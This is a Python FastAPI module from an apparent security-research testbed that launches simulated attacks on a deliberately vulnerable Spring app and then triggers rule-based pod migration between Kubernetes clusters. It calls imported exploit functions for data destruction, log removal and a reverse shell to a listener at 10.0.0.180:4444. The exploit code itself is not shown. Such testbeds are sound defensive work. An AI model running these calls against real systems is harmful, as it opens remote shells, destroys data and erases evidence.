from datetime import datetime
from fnmatch import fnmatch
from fastapi import APIRouter, HTTPException
import json
import os
from pydantic import BaseModel, Field
import sys 
from models.simulation_info import SimulationInfo
from models.migration_info import MigrationInfo
from requests import exceptions as requests_exceptions
from utils.k8s_client import k8s_client
from app_routes.migration import trigger_migration

sys.path.append('/home/ubuntu/ContMigration-VT1/apps/kubernetes/vuln-spring/')

from vuln_spring_exploit import reverse_shell, data_destruction, log_removal # type: ignore

router = APIRouter()
DEFAULT_SIMULATION_TARGET_URL = "http://10.0.0.29:30081"
target_url = (os.getenv("SIMULATION_TARGET_URL", DEFAULT_SIMULATION_TARGET_URL) or DEFAULT_SIMULATION_TARGET_URL).rstrip("/")
DEFAULT_SIMULATION_RULES_PATH = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "simulation_rules.json")
)
SIMULATION_RULES_PATH = os.getenv("SIMULATION_RULES_PATH", DEFAULT_SIMULATION_RULES_PATH)
SUPPORTED_ATTACK_TYPES = {"reverse_shell", "data_destruction", "log_removal"}
SUPPORTED_APP_PREFIX = "vuln-spring"

class SimulationRule(BaseModel):
    name: str = Field(..., description="Human-readable rule name")
    enabled: bool = True
    appNamePattern: str = "*"
    attackTypes: list[str] = Field(default_factory=list)
    sourceCluster: str
    targetCluster: str
    namespace: str = "default"
    registryAddress: str | None = None
    forensicAnalysis: bool = False
    AISuggestion: bool = False
    disableIstioSidecar: bool = False
    skipCpuCompatCheck: bool = True
    cleanupIncompatibleMounts: bool = False

class SimulationRulesPayload(BaseModel):
    rules: list[SimulationRule]

def _load_simulation_rules_payload() -> dict:
    try:
        with open(SIMULATION_RULES_PATH, "r") as file:
            data = json.load(file)
    except FileNotFoundError as exc:
        raise HTTPException(
            status_code=500,
            detail=f"Simulation rules file not found: {SIMULATION_RULES_PATH}"
        ) from exc
    except json.JSONDecodeError as exc:
        raise HTTPException(
            status_code=500,
            detail=f"Invalid simulation rules JSON in {SIMULATION_RULES_PATH}: {exc}"
        ) from exc

    if not isinstance(data, dict) or not isinstance(data.get("rules"), list):
        raise HTTPException(
            status_code=500,
            detail=f"Invalid simulation rules format in {SIMULATION_RULES_PATH}: expected object with 'rules' array"
        )
    return data

def _load_simulation_rules() -> list[dict]:
    payload = SimulationRulesPayload.model_validate(_load_simulation_rules_payload())
    return [rule.model_dump() for rule in payload.rules]

def _save_simulation_rules(rules: list[dict]):
    payload = SimulationRulesPayload.model_validate({"rules": rules})
    with open(SIMULATION_RULES_PATH, "w") as file:
        json.dump(payload.model_dump(), file, indent=4)

def _normalize_attack_types(attack_types: list[str] | None) -> set[str]:
    if not attack_types:
        return set()
    return {str(value).strip() for value in attack_types if str(value).strip()}

def _rules_target_conflict(existing_rule: dict, new_rule: SimulationRule) -> bool:
    same_scope = (
        str(existing_rule.get("appNamePattern", "*")).strip() == (new_rule.appNamePattern or "*").strip()
        and str(existing_rule.get("sourceCluster", "")).strip() == new_rule.sourceCluster.strip()
        and str(existing_rule.get("targetCluster", "")).strip() == new_rule.targetCluster.strip()
        and str(existing_rule.get("namespace", "default")).strip() == (new_rule.namespace or "default").strip()
    )
    if not same_scope:
        return False

    existing_attacks = _normalize_attack_types(existing_rule.get("attackTypes"))
    new_attacks = _normalize_attack_types(new_rule.attackTypes)
    # Empty list means "all attack types", therefore overlaps with everything.
    if not existing_attacks or not new_attacks:
        return True
    return len(existing_attacks.intersection(new_attacks)) > 0


def _find_conflicting_rule_index(
    rules: list[dict], rule: SimulationRule, skip_index: int | None = None
) -> int | None:
    for i, existing_rule in enumerate(rules):
        if skip_index is not None and i == skip_index:
            continue
        if _rules_target_conflict(existing_rule, rule):
            return i
    return None


def _rule_matches(rule: dict, app_name: str, attack_type: str) -> bool:
    if not rule.get("enabled", True):
        return False

    app_pattern = str(rule.get("appNamePattern", "*")).strip() or "*"
    if not fnmatch(app_name, app_pattern):
        return False

    attack_types = rule.get("attackTypes", [])
    if not isinstance(attack_types, list):
        return False
    if attack_types and attack_type not in [str(x).strip() for x in attack_types]:
        return False
    return True

def _find_source_pod(source_cluster: str, namespace: str, app_name: str) -> str:
    client = k8s_client.get_client(source_cluster)
    pods = client.list_namespaced_pod(namespace=namespace, label_selector=f"app={app_name}")
    running = [pod for pod in pods.items if pod.status and pod.status.phase == "Running"]
    if not running:
        raise HTTPException(
            status_code=404,
            detail=f"No running pod found for app '{app_name}' in {source_cluster}/{namespace}"
        )
    return running[0].metadata.name

async def _maybe_trigger_rule_based_migration(app_name: str, attack_type: str):
    rules = _load_simulation_rules()
    for rule in rules:
        if not _rule_matches(rule, app_name, attack_type):
            continue

        source_cluster = str(rule.get("sourceCluster", "")).strip()
        target_cluster = str(rule.get("targetCluster", "")).strip()
        namespace = str(rule.get("namespace", "default")).strip() or "default"
        if not source_cluster or not target_cluster:
            raise HTTPException(status_code=500, detail="Simulation rule missing sourceCluster/targetCluster")
        if source_cluster == target_cluster:
            raise HTTPException(status_code=500, detail="Simulation rule has identical sourceCluster and targetCluster")
        if not k8s_client.has_cluster(source_cluster):
            raise HTTPException(status_code=400, detail=f"Unknown source cluster in simulation rule: {source_cluster}")
        if not k8s_client.has_cluster(target_cluster):
            raise HTTPException(status_code=400, detail=f"Unknown target cluster in simulation rule: {target_cluster}")

        pod_name = _find_source_pod(source_cluster, namespace, app_name)
        info = MigrationInfo(
            k8s_pod_name=pod_name,
            container_name=app_name,
            migration_type="manual",
            source_cluster=source_cluster,
            target_cluster=target_cluster,
            namespace=namespace,
            registry_address=((rule.get("registryAddress") or "")).strip() or None,
            forensic_analysis=bool(rule.get("forensicAnalysis", False)),
            AI_suggestion=bool(rule.get("AISuggestion", False)),
            disable_istio_sidecar=bool(rule.get("disableIstioSidecar", False)),
            skip_cpu_compat_check=bool(rule.get("skipCpuCompatCheck", True)),
            cleanup_incompatible_mounts=bool(rule.get("cleanupIncompatibleMounts", False)),
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        migration = await trigger_migration(info)
        return {
            "rule_name": rule.get("name", "unnamed-rule"),
            "source_cluster": source_cluster,
            "target_cluster": target_cluster,
            "namespace": namespace,
            "pod_name": pod_name,
            "migration": migration
        }

    return None

@router.get("/rules")
def get_simulation_rules():
    return _load_simulation_rules_payload()

@router.post("/rules")
def add_simulation_rule(rule: SimulationRule):
    payload = _load_simulation_rules_payload()
    rules = payload.get("rules", [])
    if _find_conflicting_rule_index(rules, rule) is not None:
        raise HTTPException(
            status_code=409,
            detail=(
                "A simulation rule already targets the same scope "
                "(appNamePattern/sourceCluster/targetCluster/namespace) with overlapping attack scenarios."
            ),
        )
    rules.append(rule.model_dump())
    _save_simulation_rules(rules)
    return {"message": "Simulation rule added successfully"}


@router.put("/rules/{index}")
def update_simulation_rule(index: int, rule: SimulationRule):
    payload = _load_simulation_rules_payload()
    rules = payload.get("rules", [])
    if index < 0 or index >= len(rules):
        raise HTTPException(status_code=404, detail=f"Index '{index}' out of range")
    if _find_conflicting_rule_index(rules, rule, skip_index=index) is not None:
        raise HTTPException(
            status_code=409,
            detail=(
                "A simulation rule already targets the same scope "
                "(appNamePattern/sourceCluster/targetCluster/namespace) with overlapping attack scenarios."
            ),
        )
    rules[index] = rule.model_dump()
    _save_simulation_rules(rules)
    return {"message": "Simulation rule updated successfully"}


@router.delete("/rules/{index}")
def delete_simulation_rule(index: int):
    payload = _load_simulation_rules_payload()
    rules = payload.get("rules", [])
    if index < 0 or index >= len(rules):
        raise HTTPException(status_code=404, detail=f"Index '{index}' out of range")
    deleted = rules.pop(index)
    _save_simulation_rules(rules)
    return {"message": f"Simulation rule at index '{index}' deleted successfully", "deleted_rule": deleted}

@router.post("")
async def simulate(simInfo: SimulationInfo):
    print(f"Received simulation request for {simInfo.attackType}")
    print(f"App name: {simInfo.appName}")
    app_name = (simInfo.appName or "").strip()
    attack_type = (simInfo.attackType or "").strip()

    if not app_name:
        raise HTTPException(status_code=400, detail="appName is required")
    if not attack_type:
        raise HTTPException(status_code=400, detail="attackType is required")
    if attack_type not in SUPPORTED_ATTACK_TYPES:
        raise HTTPException(status_code=400, detail=f"Unsupported attackType: {attack_type}")
    if not app_name.startswith(SUPPORTED_APP_PREFIX):
        raise HTTPException(
            status_code=400,
            detail=f"Simulation currently supports only apps starting with '{SUPPORTED_APP_PREFIX}'. Received '{app_name}'."
        )

    try:
        if attack_type == "reverse_shell":
            reverse_shell(target_url, "10.0.0.180","4444")
            simulation_message = "Reverse shell command executed"
        elif attack_type == "data_destruction":
            data_destruction(target_url)
            simulation_message = "Data destruction command executed"
        else:
            log_removal(target_url)
            simulation_message = "Log removal command executed"

        migration_result = await _maybe_trigger_rule_based_migration(app_name, attack_type)
        response = {"message": simulation_message}
        if migration_result:
            response["autoMigration"] = migration_result
        else:
            response["autoMigration"] = {"matched": False, "message": "No matching simulation rule found"}
        return response
    except requests_exceptions.RequestException as exc:
        raise HTTPException(status_code=502, detail=f"Simulation target unreachable: {exc}") from exc
    